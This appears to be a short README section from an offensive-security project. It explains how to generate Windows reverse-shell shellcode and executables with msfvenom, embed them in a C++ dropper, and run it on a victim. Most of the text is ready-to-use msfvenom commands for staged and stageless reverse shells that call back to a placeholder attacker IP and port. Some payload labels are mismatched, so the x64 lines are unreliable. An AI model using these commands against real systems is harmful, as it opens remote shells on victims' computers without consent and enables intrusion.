## Overall Process
- First, we will pick a payload from `msfvenom` and generate shellcode for the selected staged or non-staged payload
- Adding that payload to `dropper.cpp`
- executing on victim for reverseshell... or whatever the payload is



### Building Shellcode using msfvenom

First of all, select the payload that you want to transform into shellcode.You can see a list of all the Metasploit payloads by using **msfvenom -l payloads**
- 
#### Staged Payloads for Windows
x86 `msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe`

x64 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe`

#### Stageless Payloads for Windows

x86 `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe`

x64 `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe`

